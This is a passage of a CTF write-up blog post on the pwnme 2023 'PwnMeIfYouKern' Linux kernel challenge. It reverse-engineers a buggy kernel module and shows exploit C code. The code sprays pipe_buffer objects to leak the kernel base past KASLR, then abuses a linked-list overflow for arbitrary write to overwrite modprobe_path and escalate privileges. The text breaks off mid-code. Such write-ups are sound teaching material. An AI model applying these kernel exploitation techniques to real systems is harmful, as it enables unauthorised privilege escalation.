@@ -1,0 +1,583 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[pwnme 2023 - pwn] PwnMeIfYouKern // ret2school</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="nasm" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8K5XT0SJN8"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8K5XT0SJN8', { 'anonymize_ip': false });
+}
+</script>
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[pwnme 2023 - pwn] PwnMeIfYouKern"/>
+<meta name="twitter:description" content="PwnMeIfYouKern was a linux kernel exploitation challenge from pwnme 2023.
+There were no SMAP or SMEP, but KASLR was activated.
+user@PwnMeIfYouKern:~$ cat /proc/cpuinfo | grep sm.p user@PwnMeIfYouKern:~$ cat /proc/cmdline console=ttyS0 loglevel=3 oops=panic panic=1 kaslr user@PwnMeIfYouKern:~$ cat /proc/sys/vm/mmap_min_addr 4096 TL;DR  we manipulate elements from a linked list each element contains a buffer, his size, and a pointer to the next element of the list there is a buffer overflow, we can change the size of the buffer to leak data, and overwrite the pointer to the next element to get an arbitrary read/write break kaslr by leaking a pipe_buffer structure overwrite modprobe_path enjoy  Reverse engineering Here is the write function :"/>
+
+    <meta property="og:title" content="[pwnme 2023 - pwn] PwnMeIfYouKern" />
+<meta property="og:description" content="PwnMeIfYouKern was a linux kernel exploitation challenge from pwnme 2023.
+There were no SMAP or SMEP, but KASLR was activated.
+user@PwnMeIfYouKern:~$ cat /proc/cpuinfo | grep sm.p user@PwnMeIfYouKern:~$ cat /proc/cmdline console=ttyS0 loglevel=3 oops=panic panic=1 kaslr user@PwnMeIfYouKern:~$ cat /proc/sys/vm/mmap_min_addr 4096 TL;DR  we manipulate elements from a linked list each element contains a buffer, his size, and a pointer to the next element of the list there is a buffer overflow, we can change the size of the buffer to leak data, and overwrite the pointer to the next element to get an arbitrary read/write break kaslr by leaking a pipe_buffer structure overwrite modprobe_path enjoy  Reverse engineering Here is the write function :" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ret2school.github.io/post/pwn_me_if_you_kern/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2023-05-09T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-05-09T00:00:00+00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
+      <h1>ret2school</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             / 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Just a bunch of french ctf players</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/ret2school" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/ret2school_fr" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[pwnme 2023 - pwn] PwnMeIfYouKern</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          May 9, 2023
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          10 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
+              <a class="tag" href="https://ret2school.github.io/tags/tek/">Tek</a>
+              <a class="tag" href="https://ret2school.github.io/tags/linux/">linux</a>
+              <a class="tag" href="https://ret2school.github.io/tags/kernel/">kernel</a>
+              <a class="tag" href="https://ret2school.github.io/tags/pwnme/">pwnme</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>PwnMeIfYouKern was a linux kernel exploitation challenge from pwnme 2023.</p>
+<p>There were no SMAP or SMEP, but KASLR was activated.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">user@PwnMeIfYouKern:~$ cat /proc/cpuinfo | grep sm.p
+user@PwnMeIfYouKern:~$ cat /proc/cmdline
+<span style="color:#8be9fd;font-style:italic">console</span><span style="color:#ff79c6">=</span>ttyS0 <span style="color:#8be9fd;font-style:italic">loglevel</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span> <span style="color:#8be9fd;font-style:italic">oops</span><span style="color:#ff79c6">=</span>panic <span style="color:#8be9fd;font-style:italic">panic</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span> kaslr
+user@PwnMeIfYouKern:~$ cat /proc/sys/vm/mmap_min_addr
+<span style="color:#bd93f9">4096</span>
+</code></pre></div><h2 id="tldr">TL;DR</h2>
+<ul>
+<li>we manipulate elements from a linked list</li>
+<li>each element contains a buffer, his size, and a pointer to the next element of
+the list</li>
+<li>there is a buffer overflow, we can change the size of the buffer to leak data,
+and overwrite the pointer to the next element to get an arbitrary read/write</li>
+<li>break kaslr by leaking a <code>pipe_buffer</code> structure</li>
+<li>overwrite <code>modprobe_path</code></li>
+<li>enjoy</li>
+</ul>
+<h2 id="reverse-engineering">Reverse engineering</h2>
+<p>Here is the <code>write</code> function :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">size_t <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">pwnmeifyoukern_write</span>(<span style="color:#8be9fd">int</span> u_fd, <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>u_buf, size_t u_count)
+{
+  arg_t <span style="color:#ff79c6">*</span>arg; <span style="color:#6272a4">// rax MAPDST
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> want_new_item; <span style="color:#6272a4">// edx
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> idx; <span style="color:#6272a4">// ecx
+</span><span style="color:#6272a4"></span>  item_t <span style="color:#ff79c6">*</span>target; <span style="color:#6272a4">// rax
+</span><span style="color:#6272a4"></span>  item_t <span style="color:#ff79c6">*</span>new_item; <span style="color:#6272a4">// rax
+</span><span style="color:#6272a4"></span>  item_t <span style="color:#ff79c6">*</span>head; <span style="color:#6272a4">// rdx
+</span><span style="color:#6272a4"></span>
+  printk(<span style="color:#ff79c6">&amp;</span>unk_3AD);
+  arg <span style="color:#ff79c6">=</span> (arg_t <span style="color:#ff79c6">*</span>)_kmalloc(u_count, <span style="color:#bd93f9">3264LL</span>);
+  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>arg )
+    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">12LL</span>;
+  <span style="color:#ff79c6">if</span> ( u_count <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0x7FFFFFFF</span> <span style="color:#ff79c6">||</span> copy_from_user(arg, u_buf, u_count) )
+  {
+    kfree(arg);
+    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">14LL</span>;
+  }
+  want_new_item <span style="color:#ff79c6">=</span> arg<span style="color:#ff79c6">-&gt;</span>want_new_item;
+  <span style="color:#ff79c6">if</span> ( arg<span style="color:#ff79c6">-&gt;</span>want_new_item )
+  {
+    <span style="color:#ff79c6">if</span> ( want_new_item <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span> )
+    {
+      new_item <span style="color:#ff79c6">=</span> (item_t <span style="color:#ff79c6">*</span>)_kmalloc(u_count <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x10C</span>, <span style="color:#bd93f9">3264LL</span>);
+      <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>new_item )
+      {
+        kfree(arg);
+        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">12LL</span>;
+      }
+      <span style="color:#ff79c6">++</span>list.nb_items;
+      qmemcpy(new_item, <span style="color:#ff79c6">&amp;</span>arg<span style="color:#ff79c6">-&gt;</span>idx, u_count <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">4</span>);<span style="color:#6272a4">// when want_new_item == 1, there is no arg-&gt;idx, the buffer is at arg+4 (in place of idx)
+</span><span style="color:#6272a4"></span>      new_item<span style="color:#ff79c6">-&gt;</span>size <span style="color:#ff79c6">=</span> u_count <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">4</span>;
+      head <span style="color:#ff79c6">=</span> list.head;
+      list.head <span style="color:#ff79c6">=</span> new_item;
+      new_item<span style="color:#ff79c6">-&gt;</span>next <span style="color:#ff79c6">=</span> head;                    <span style="color:#6272a4">// insert at the beginning of the list
+</span><span style="color:#6272a4"></span>      <span style="color:#ff79c6">goto</span> end;
+    }
+<span style="color:#8be9fd;font-style:italic">err</span>:
+    kfree(arg);
+    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">22LL</span>;
+  }
+  idx <span style="color:#ff79c6">=</span> arg<span style="color:#ff79c6">-&gt;</span>idx;
+  <span style="color:#ff79c6">if</span> ( idx <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">||</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span>)idx <span style="color:#ff79c6">&gt;=</span> list.nb_items )
+    <span style="color:#ff79c6">goto</span> err;
+  target <span style="color:#ff79c6">=</span> list.head;
+  <span style="color:#ff79c6">while</span> ( want_new_item <span style="color:#ff79c6">!=</span> idx )
+  {
+    target <span style="color:#ff79c6">=</span> target<span style="color:#ff79c6">-&gt;</span>next;
+    <span style="color:#ff79c6">++</span>want_new_item;
+  }
+  qmemcpy(target, arg<span style="color:#ff79c6">-&gt;</span>buf, u_count <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">8</span>);       <span style="color:#6272a4">// buffer overflow
+</span><span style="color:#6272a4"></span>  target<span style="color:#ff79c6">-&gt;</span>size <span style="color:#ff79c6">=</span> u_count <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">8</span>;
+<span style="color:#8be9fd;font-style:italic">end</span>:
+  kfree(arg);
+  <span style="color:#ff79c6">return</span> u_count;
+}
+</code></pre></div><p>When we ask for a new item, the module reads from user a structure like this one
+:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">struct</span> arg_t {
+  <span style="color:#8be9fd">int</span> want_new_item;
+  <span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">1</span>]; <span style="color:#6272a4">// user-defined size
+</span><span style="color:#6272a4"></span>};
+</code></pre></div><p>It then allocates a new structure of size <code>u_count + 0x10C</code>, it is the new
+element of the list, and copies the user buffer into this new element.</p>
+<p>Here is the structure of an element :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">struct</span> item_t {
+  <span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">256</span>];
+  <span style="color:#ff79c6">__int64</span> size;
+  item_t <span style="color:#ff79c6">*</span>next;
+  <span style="color:#8be9fd">char</span> padding[u_count<span style="color:#ff79c6">-</span><span style="color:#bd93f9">4</span>]; <span style="color:#6272a4">// wtf
+</span><span style="color:#6272a4"></span>};
+</code></pre></div><p>As you can see, <code>buf</code> is a fixed size buffer of 256 bytes. We can copy an
+arbitrary sized buffer into it so we can overwrite <code>size</code> and <code>next</code>. However,
+we can not overflow on an adjacent structure, and the <code>size</code> is updated according
+to our input buffer. Therefore we are only able to control the <code>next</code> member,
+giving us arbitrary read/write primitives.</p>
+<p>The new element is inserted at the beginning of the linked list.</p>
+<p>If we call the write function without <code>want_new_item</code> set to 1, it expects a
+structure such as :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">struct</span> arg_t {
+  <span style="color:#8be9fd">int</span> want_new_item;
+  <span style="color:#8be9fd">int</span> idx;
+  <span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">1</span>]; <span style="color:#6272a4">// user-defined size
+</span><span style="color:#6272a4"></span>};
+</code></pre></div><p>So, we can specify the index of the element we want to edit, the function then
+copies the whole buffer to the already existing element without checking that
+the size of the new buffer is less than the size of the existing element&rsquo;s
+buffer. There is a buffer overflow and we can overflow on the following
+structures. The size of the element is updated to suit the size of our input
+buffer, so we can not leak data by just submitting a large buffer as we would
+overwrite the data.</p>
+<p>The <code>read</code> function is pretty simple.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">pwnmeifyoukern_read</span>(<span style="color:#8be9fd">int</span> u_fd, <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>u_buf, size_t u_count)
+{
+  <span style="color:#ff79c6">__int64</span> nb_copied; <span style="color:#6272a4">// rbx
+</span><span style="color:#6272a4"></span>  item_t <span style="color:#ff79c6">*</span>head; <span style="color:#6272a4">// r14
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> i; <span style="color:#6272a4">// rcx MAPDST
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> item_size; <span style="color:#6272a4">// r13
+</span><span style="color:#6272a4"></span>
+  nb_copied <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
+  printk(<span style="color:#ff79c6">&amp;</span>unk_3C8);
+  head <span style="color:#ff79c6">=</span> list.head;
+  <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>; i <span style="color:#ff79c6">&lt;</span> list.nb_items; <span style="color:#ff79c6">++</span>i )
+  {
+    item_size <span style="color:#ff79c6">=</span> head<span style="color:#ff79c6">-&gt;</span>size;
+    <span style="color:#ff79c6">if</span> ( u_count <span style="color:#ff79c6">&lt;</span> nb_copied <span style="color:#ff79c6">+</span> item_size )
+      item_size <span style="color:#ff79c6">=</span> u_count <span style="color:#ff79c6">-</span> nb_copied;
+    <span style="color:#ff79c6">if</span> ( item_size <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0x80000000</span> <span style="color:#ff79c6">||</span> copy_to_user(<span style="color:#ff79c6">&amp;</span>u_buf[nb_copied], head, item_size, i, <span style="color:#bd93f9">0x80000000LL</span>) )
+      <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">14LL</span>;
+    nb_copied <span style="color:#ff79c6">+=</span> item_size;
+    <span style="color:#ff79c6">if</span> ( u_count <span style="color:#ff79c6">==</span> nb_copied )
+      <span style="color:#ff79c6">break</span>;
+    head <span style="color:#ff79c6">=</span> head<span style="color:#ff79c6">-&gt;</span>next;
+  }
+  <span style="color:#ff79c6">return</span> nb_copied;
+}
+</code></pre></div><p>It just copies <code>u_count</code> bytes to the user buffer. If the first element contains
+less than <code>u_count</code> bytes, it will read the buffer of the first element, the one
+of the second element, and so on, until it reads <code>u_count</code> bytes.</p>
+<p>We saw that we can overwrite the size of an element, as well as the <code>next</code>
+pointer. So we have an out of bounds read and an arbitrary read.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>First of all, we create an item and update its size to leak a coming structure.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">memset(buf, <span style="color:#f1fa8c">&#39;A&#39;</span>, BUF_SIZE);
+new_item(buf, <span style="color:#bd93f9">0x100</span>); <span style="color:#6272a4">// A
+</span><span style="color:#6272a4"></span>
+<span style="color:#6272a4">// change A.size
+</span><span style="color:#6272a4"></span>memset(buf, <span style="color:#bd93f9">0</span>, BUF_SIZE);
+memset(buf, <span style="color:#f1fa8c">&#39;A&#39;</span>, <span style="color:#bd93f9">0x100</span>);
+<span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)(buf <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x100</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x1337</span>; <span style="color:#6272a4">// size (will be overwritten
+</span><span style="color:#6272a4"></span><span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)(buf <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x108</span>) <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;  <span style="color:#6272a4">// next
+</span><span style="color:#6272a4"></span>edit_item(<span style="color:#bd93f9">0</span>, buf, <span style="color:#bd93f9">0x400</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x30</span>); <span style="color:#6272a4">// new size
+</span></code></pre></div><p>I have choosen to target <code>kmalloc-1024</code> (<code>0x100 + 0x10c = 0x20c = 524</code>) because
+there were no allocation on this cache which makes my exploit more reliable.</p>
+<p>As a target structure to leak, I have choosen a <code>struct pipe_buffer</code> (thanks to
+<a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html#bypassing-kaslrsmep">https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html#bypassing-kaslrsmep</a>)
+as it fits in <code>kmalloc-1024</code> and contains a pointer to a structure in the
+<code>.data</code> segment, allowing us to leak the kernel base address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#6272a4">// spray with pipe_buffer
+</span><span style="color:#6272a4">// https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/exploit.c
+</span><span style="color:#6272a4"></span>printf(<span style="color:#f1fa8c">&#34;[*] Spraying pipe_buffer objects...</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> NUM_PIPEFDS; i<span style="color:#ff79c6">++</span>) {
+    <span style="color:#ff79c6">if</span> (pipe(pipefd[i]) <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
+        err(<span style="color:#f1fa8c">&#34;pipe&#34;</span>);
+    }
+    <span style="color:#6272a4">// Write something to populate pipe_buffer.
+</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span> (write(pipefd[i][<span style="color:#bd93f9">1</span>], <span style="color:#f1fa8c">&#34;pwn&#34;</span>, <span style="color:#bd93f9">3</span>) <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
+        err(<span style="color:#f1fa8c">&#34;pipe write&#34;</span>);
+    }
+}
+</code></pre></div><p>This gives us the following heap layout :</p>
+<p><img src="img/heap_layout.png" alt="Heap layout after spraying with pipe_buffer objects."></p>
+<p>We now have to read 0x418 bytes to leak <code>pipe_buffer.ops</code> and break KASLR.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6272a4">// read A and leak pipe_buffer.ops
+</span><span style="color:#6272a4"></span>memset(buf, <span style="color:#bd93f9">0</span>, BUF_SIZE);
+n <span style="color:#ff79c6">=</span> read(fd, buf, <span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x30</span>);
+<span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">==</span> n) {
+    err(<span style="color:#f1fa8c">&#34;read&#34;</span>);
+}
+<span style="color:#6272a4">//hex_view(buf, n);
+</span><span style="color:#6272a4"></span>
+leak <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)(buf <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x400</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x10</span>);
+kbase <span style="color:#ff79c6">=</span> leak <span style="color:#ff79c6">-</span> (<span style="color:#bd93f9">0xffffffffa8210840</span> <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0xffffffffa7a00000</span>);
+modprobe_path <span style="color:#ff79c6">=</span> kbase <span style="color:#ff79c6">+</span> (<span style="color:#bd93f9">0xffffffff89251a00</span> <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0xffffffff88800000</span>);
+
+printf(<span style="color:#f1fa8c">&#34;[+] pipe_buffer.ops = %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, leak);
+printf(<span style="color:#f1fa8c">&#34;[+] kbase = %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, kbase);
+printf(<span style="color:#f1fa8c">&#34;[+] modprobe_path @ %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, modprobe_path);
+</code></pre></div><p>Now that we have the kernel base address, I have choosen to overwrite
+<code>modprobe_path</code> as it is a fast and easy way to privesc. We could also make
+the kernel executes <code>commit_creds(prepare_creds())</code> by overwritting
+<code>pipe_buffer.ops</code> with a userland pointer to execute our own functions as there
+is no SMAP or SMEP, but by overwritting <code>modprobe_path</code>, our exploit will work
+even with these protections enabled.</p>
+<p>We will use the first buffer overflow to overwrite the <code>next</code> pointer with
+<code>modprobe_path</code>. We have to create a new item before overwritting the <code>next</code>
+field in order to have 2 elements in the linked list :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">memset(buf, <span style="color:#f1fa8c">&#39;A&#39;</span>, BUF_SIZE);
+new_item(buf, <span style="color:#bd93f9">0x100</span>); <span style="color:#6272a4">// B -&gt; A
+</span><span style="color:#6272a4"></span>
+
+<span style="color:#6272a4">// B.next = modprobe_path
+</span><span style="color:#6272a4"></span>memset(buf, <span style="color:#bd93f9">0</span>, BUF_SIZE);
+<span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)(buf <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x108</span>) <span style="color:#ff79c6">=</span> modprobe_path;
+edit_item(<span style="color:#bd93f9">0</span>, buf, <span style="color:#bd93f9">0x110</span>);
+
+<span style="color:#6272a4">// overwrite modprobe_path
+</span><span style="color:#6272a4"></span>strncpy(buf, <span style="color:#f1fa8c">&#34;/home/user/pld&#34;</span>, BUF_SIZE);
+edit_item(<span style="color:#bd93f9">1</span>, buf, strlen(buf) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>);
+</code></pre></div><p>Unfortunately for us, there are two pointers at <code>modprobe_path+0x100</code> and we
+just overwrote them, making the kernel panics when executing the file starting
+with an unknown magic number.</p>
+<pre tabindex="0"><code>gef➤  tel 0xffffffff92a51a00 -l 40
+0xffffffff92a51a00│+0x0000: &quot;/sbin/modprobe&quot;
+0xffffffff92a51a08│+0x0008: 0x000065626f727064 (&quot;dprobe&quot;?)
+0xffffffff92a51a10│+0x0010: 0x0000000000000000
+0xffffffff92a51a18│+0x0018: 0x0000000000000000
+0xffffffff92a51a20│+0x0020: 0x0000000000000000
+0xffffffff92a51a28│+0x0028: 0x0000000000000000
+0xffffffff92a51a30│+0x0030: 0x0000000000000000
+0xffffffff92a51a38│+0x0038: 0x0000000000000000
+0xffffffff92a51a40│+0x0040: 0x0000000000000000
+0xffffffff92a51a48│+0x0048: 0x0000000000000000
+0xffffffff92a51a50│+0x0050: 0x0000000000000000
+0xffffffff92a51a58│+0x0058: 0x0000000000000000
+0xffffffff92a51a60│+0x0060: 0x0000000000000000
+0xffffffff92a51a68│+0x0068: 0x0000000000000000
+0xffffffff92a51a70│+0x0070: 0x0000000000000000
+0xffffffff92a51a78│+0x0078: 0x0000000000000000
+0xffffffff92a51a80│+0x0080: 0x0000000000000000
+0xffffffff92a51a88│+0x0088: 0x0000000000000000
+0xffffffff92a51a90│+0x0090: 0x0000000000000000
+0xffffffff92a51a98│+0x0098: 0x0000000000000000
+0xffffffff92a51aa0│+0x00a0: 0x0000000000000000
+0xffffffff92a51aa8│+0x00a8: 0x0000000000000000
+0xffffffff92a51ab0│+0x00b0: 0x0000000000000000
+0xffffffff92a51ab8│+0x00b8: 0x0000000000000000
+0xffffffff92a51ac0│+0x00c0: 0x0000000000000000
+0xffffffff92a51ac8│+0x00c8: 0x0000000000000000
+0xffffffff92a51ad0│+0x00d0: 0x0000000000000000
+0xffffffff92a51ad8│+0x00d8: 0x0000000000000000
+0xffffffff92a51ae0│+0x00e0: 0x0000000000000000
+0xffffffff92a51ae8│+0x00e8: 0x0000000000000000
+0xffffffff92a51af0│+0x00f0: 0x0000000000000000
+0xffffffff92a51af8│+0x00f8: 0x0000000000000000
+0xffffffff92a51b00│+0x0100: 0xffffffff92a51b00  →  [loop detected]
+0xffffffff92a51b08│+0x0108: 0xffffffff92a51b00  →  0xffffffff92a51b00  →  [loop
+detected]
+0xffffffff92a51b10│+0x0110: 0x0000000000000032 (&quot;2&quot;?)
+</code></pre><p>So we have to make a backup of this memory area, then overwrite <code>modprobe_path</code>
+and rewrite the backup.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">memset(buf, <span style="color:#f1fa8c">&#39;A&#39;</span>, BUF_SIZE);
+new_item(buf, <span style="color:#bd93f9">0x100</span>); <span style="color:#6272a4">// B -&gt; A
+</span><span style="color:#6272a4"></span>
+
+<span style="color:#6272a4">// B.next = modprobe_path
+</span><span style="color:#6272a4"></span>memset(buf, <span style="color:#bd93f9">0</span>, BUF_SIZE);
